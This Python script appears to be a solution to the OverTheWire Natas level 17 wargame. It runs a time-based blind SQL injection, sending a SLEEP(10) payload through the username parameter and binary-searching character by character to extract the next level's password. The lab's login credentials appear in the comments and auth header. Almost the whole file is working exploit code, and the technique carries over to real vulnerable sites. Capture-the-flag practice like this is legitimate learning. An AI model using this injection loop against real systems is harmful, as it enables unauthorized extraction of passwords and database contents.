import time
import urllib.request
#generate list of characters
chars=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

#The login for natas15 basic auth username & password are combined with a colon then utf-8 base64 is applied. This becomes Http header.
#natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
#Authorization: Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==
#URL codes are needed for spaces and the unbalanced quote
# %20 = space
# %22 = "

#now we can try hacking!!

#we need to make effective request in a loop up to 32 characters long for the length of the password
# we also  should used a halving algorith to quickly find each letter
pwd=""
#pwd=""


lbound=0
ubound=(len(chars)-1)
new_c=""
for c in range(0,32):
	lbound=0
	ubound=len(chars)
	while True:
		mid=((ubound+lbound)//2) #floor division
		print("LB={0} Mid={1} UB={2}".format(lbound,mid,ubound),end=" ")
		if lbound==mid:
			print("\nFound:"+chars[mid],end="\n\n")
			pwd=pwd+chars[mid]
			break
		new_c=pwd+chars[mid]
		req=urllib.request.Request("http://natas17.natas.labs.overthewire.org/index.php?username=natas18%22%20AND%20STRCMP(BINARY%20\""+new_c+"\",password)<0%20AND%20SLEEP(10)%20--%20&debug=1")
		req.add_header('Authorization','Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==')
		t1=time.time()
		r=urllib.request.urlopen(req)
		t2=time.time()
		print("HTTP GET Status={0}".format(r.status))

		#Now instead of regular expression we compare time in seconds from sending request to getting result.
		
		if (t2-t1)>9: #9 seconds (we've waited for at least 10 seconds on the server. Transit delay to send data is  between 1-2 seconds.
			#Guess pass is less than password
			print("Pass > "+new_c)
			lbound=mid
		else:
			#Guess is greater than password
			ubound=mid
			print("Pass < "+new_c)
		time.sleep(1.0)
#we have a request that can  use looping to  slowy get the password, try every letter until
print("Password: "+pwd)
